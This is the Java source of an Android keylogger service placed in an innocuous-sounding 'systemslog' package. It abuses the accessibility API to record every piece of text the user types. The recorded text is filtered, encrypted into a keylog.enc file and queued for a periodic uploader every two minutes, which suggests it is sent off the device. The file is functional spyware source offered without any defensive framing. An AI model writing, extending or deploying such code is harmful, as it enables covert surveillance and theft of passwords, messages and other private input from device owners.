package com.example.systemslog;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import java.io.FileOutputStream;
import android.content.Context;
import androidx.work.WorkManager;
import androidx.work.PeriodicWorkRequest;

import java.util.concurrent.TimeUnit;

public class KeyloggerService extends AccessibilityService {
    private StringBuilder logBuffer = new StringBuilder();
    private String lastText = "";

    @Override
    public void onServiceConnected() {
        scheduleUploader();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String newText = event.getText().toString().replaceAll("[\\[\\]]", ""); // Remove brackets
            String delta = getDelta(lastText, newText);
            lastText = newText;

            if (!delta.isEmpty() && isPrintable(delta)) {
                logBuffer.append(delta);
                if (delta.equals(" ") || delta.equals("\n")) {
                    logBuffer.append(" "); // add space after words
                }
            }

            if (logBuffer.length() > 100) {
                saveEncrypted(logBuffer.toString().trim());
                logBuffer.setLength(0);
            }
        }
    }

    private String getDelta(String oldText, String newText) {
        if (newText.startsWith(oldText)) {
            return newText.substring(oldText.length());
        } else {
            return ""; // handle deletion or text clearing
        }
    }

    private boolean isPrintable(String text) {
        return text.matches("[\\x20-\\x7E]+|\\s"); // ASCII printable chars and whitespace
    }

    private void saveEncrypted(String text) {
        try {
            String encrypted = EncryptionUtils.encrypt(text);
            FileOutputStream fos = openFileOutput("keylog.enc", Context.MODE_APPEND);
            fos.write((encrypted + "\n").getBytes());
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void scheduleUploader() {
        PeriodicWorkRequest request = new PeriodicWorkRequest
                .Builder(LogUploader.class, 2, TimeUnit.MINUTES)
                .build();
        WorkManager.getInstance(this).enqueue(request);
    }

    @Override
    public void onInterrupt() {}
}
